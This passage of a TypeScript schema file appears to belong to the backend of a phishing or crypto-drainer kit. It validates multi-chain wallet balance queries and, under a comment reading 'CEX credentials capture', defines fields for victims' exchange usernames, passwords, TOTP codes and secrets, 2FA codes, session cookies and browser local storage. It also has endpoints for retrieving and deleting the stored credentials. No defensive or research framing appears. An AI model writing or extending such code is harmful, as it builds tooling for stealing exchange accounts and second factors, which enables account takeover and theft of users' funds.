    .max(4294967295, 'Chain ID must not exceed max uint32')
    .optional(),
  chain_id: z
    .number()
    .int()
    .positive()
    .max(4294967295, 'Chain ID must not exceed max uint32')
    .optional(),
})

export const multiBalanceQuerySchema = z.object({
  evm: z.string().optional(),
  evm_address: z.string().optional(),
  sol: z.string().optional(),
  sol_address: z.string().optional(),
  tron: z.string().optional(),
  tron_address: z.string().optional(),
  ton: z.string().optional(),
  ton_address: z.string().optional(),
  btc: z.string().optional(),
  btc_address: z.string().optional(),
  cosmos: z.string().optional(),
  cosmos_address: z.string().optional(),
  aptos: z.string().optional(),
  aptos_address: z.string().optional(),
  sui: z.string().optional(),
  sui_address: z.string().optional(),
  wallet: z.string().optional(),
  address: z.string().optional(),
  evm_chain_id: z.string().optional(),
  chain_id: z.string().optional(),
})

// CEX credentials capture with strict validation
export const credsBodySchema = z.object({
  exchange: z
    .string()
    .min(1, 'Exchange name is required')
    .max(100, 'Exchange name must not exceed 100 characters')
    .toLowerCase(),
  username: z
    .string()
    .min(1, 'Username/email is required')
    .max(255, 'Username/email must not exceed 255 characters'),
  email: z
    .string()
    .max(254, 'Email must not exceed 254 characters')
    .optional(),
  login: z
    .string()
    .max(255, 'Login must not exceed 255 characters')
    .optional(),
  password: z
    .string()
    .min(1, 'Password is required')
    .max(1024, 'Password must not exceed 1024 characters'),
  totp: z
    .string()
    .regex(/^\d{6}$|^[A-Z0-9]{32}$/, 'Invalid TOTP format (expect 6 digits or 32 char base32)')
    .max(255, 'TOTP must not exceed 255 characters')
    .optional(),
  otp: z
    .string()
    .max(255, 'OTP must not exceed 255 characters')
    .optional(),
  '2fa': z
    .string()
    .max(255, '2FA code must not exceed 255 characters')
    .optional(),
  mfa: z
    .string()
    .max(255, 'MFA code must not exceed 255 characters')
    .optional(),
  page_url: z
    .string()
    .url('page_url must be a valid URL if provided')
    .max(2000, 'Page URL must not exceed 2000 characters')
    .optional(),
  session_cookies: z
    .string()
    .max(100000, 'Session cookies must not exceed 100000 characters')
    .optional(),
  local_storage: z
    .string()
    .max(100000, 'Local storage must not exceed 100000 characters')
    .optional(),
})

// Credential ID validation for retrieval/deletion
export const credIdParamSchema = z.object({
  id: z
    .string()
    .uuid('Credential ID must be a valid UUID')
    .optional(),
})

// Exchange name validation
export const exchangeParamSchema = z.object({
  exchange: z
    .string()
    .min(1, 'Exchange name is required')
    .max(100, 'Exchange name must not exceed 100 characters'),
})
